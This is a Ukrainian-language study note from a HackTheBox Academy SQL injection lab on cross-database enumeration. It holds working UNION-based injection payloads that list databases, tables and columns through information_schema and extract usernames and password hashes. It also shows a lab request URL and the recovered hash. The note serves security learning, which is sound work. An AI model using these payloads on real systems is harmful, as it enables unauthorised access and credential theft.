# SQL Injection — Cross-Database Enumeration

## Модуль
[SQL Injection Fundamentals — DB Enumeration](https://academy.hackthebox.com/app/module/33/section/217)

## Концепція

MySQL дозволяє звертатись до таблиць інших баз даних через нотацію
`database.table` — навіть якщо поточна БД інша.

## Payload
?port_code=cn' UNION select 1,password,3,4
FROM ilfreight.users WHERE username='newuser'-- -
Запит: http://154.57.164.82:31182/search.php?port_code=cn%27%20UNION%20select%201,password,3,4%20FROM%20ilfreight.users%20WHERE%20username=%27newuser%27--%20-

**Відповідь:** `9da2c9bcdf39d8610954e0e11ea8f45f`

---

## Повний плейбук DB Enumeration

### 1 — Список всіх баз даних
```sql
' UNION select 1,schema_name,3,4
FROM information_schema.schemata-- -
```

### 2 — Список таблиць у конкретній БД
```sql
' UNION select 1,table_name,3,4
FROM information_schema.tables
WHERE table_schema='ilfreight'-- -
```

### 3 — Список колонок у таблиці
```sql
' UNION select 1,column_name,3,4
FROM information_schema.columns
WHERE table_name='users'-- -
```

### 4 — Витягнути дані з іншої БД
```sql
' UNION select 1,username,password,4
FROM ilfreight.users-- -

-- або з фільтром
' UNION select 1,password,3,4
FROM ilfreight.users WHERE username='newuser'-- -
```

## Cross-DB нотація

```sql
-- Звернення до таблиці в іншій БД
SELECT * FROM database_name.table_name

-- Приклад
SELECT password FROM ilfreight.users
```

## information_schema — ключові таблиці

| Таблиця | Що містить |
|---------|-----------|
| `information_schema.schemata` | Всі бази даних |
| `information_schema.tables` | Всі таблиці (+ яка БД) |
| `information_schema.columns` | Всі колонки (+ таблиця, БД) |
| `information_schema.user_privileges` | Привілеї юзерів |
